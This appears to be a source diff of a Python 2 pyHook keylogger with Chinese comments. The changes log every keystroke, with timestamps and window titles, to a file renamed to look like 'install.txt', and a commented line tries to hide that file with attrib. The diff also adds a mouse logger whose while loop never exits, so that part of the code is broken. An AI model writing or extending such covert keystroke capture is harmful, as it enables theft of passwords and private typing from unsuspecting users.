@@ -2,17 +2,27 @@
 import pythoncom
 import pyHook
 import datetime
+import os
 oldname = ''
+oldnamem = ''
 
 def onMouseEvent(event):
     # 监听鼠标事件
-    print "MessageName:", event.MessageName
-    #print "Message:", event.Message
-    print "Time:", datetime.datetime.now()
-    #print "Window:", event.Window
-    print "WindowName:", event.WindowName
-    print "Position:", event.Position
-    #print "Wheel:", event.Wheel
+    wrfile2 = open(r'd://install5.txt', 'a')
+    evtname2 = event.WindowName
+    global oldnamem
+    while evtname2 != oldnamem:
+        wrfile2.write( "---------\n")
+        wrfile2.write( "MessageName:%s\n" % event.MessageName)
+        #wrfile2.write( "Time:%s\n" % datetime.datetime.now())
+        wrfile2.write( "WindowName:%s\n" % event.WindowName)
+    #print "MessageName:", event.MessageName
+    #   print "Message:", event.Message
+    #print "Time:", datetime.datetime.now()
+    #   print "Window:", event.Window
+    #print "WindowName:", event.WindowName
+    #   print "Position:", event.Position
+    #   print "Wheel:", event.Wheel
     #print "Injected:", event.Injected
     print "---"
     # 返回 True 以便将事件传给其它处理程序
@@ -25,7 +35,8 @@ def onKeyboardEvent(event):
     # 监听键盘事件
     timeNow = datetime.datetime.now()
     Now = timeNow.strftime('%H:%M:%S')
-    wrfile = open(r'd://test1.txt', 'a')
+    #wrfile = os.popen('attrib \h d://test1.txt')
+    wrfile = open(r'd://install.txt', 'a')
     evtname = event.WindowName
     global oldname
     while evtname != oldname:
@@ -33,7 +44,7 @@ def onKeyboardEvent(event):
         wrfile.write( "WindowName:%s\n" % event.WindowName)
         wrfile.write( "Time:%s\n" % datetime.datetime.now())
         oldname = event.WindowName
-    wrfile.write( "     Key:%s              %s\n" % (event.Key, Now))
+    wrfile.write( "     Key:%s-%s  \n" % (event.Key, Now))
     #---code-debug-using---
     #evtname = event.WindowName
     #global oldname
@@ -54,7 +65,7 @@ def main():
     hm.HookKeyboard()
 
     # 监听所有鼠标事件
-    #hm.MouseAll = onMouseEvent
+    #hm.MouseLeftUp = onMouseEvent
     # 设置鼠标“钩子”
     #hm.HookMouse()
 
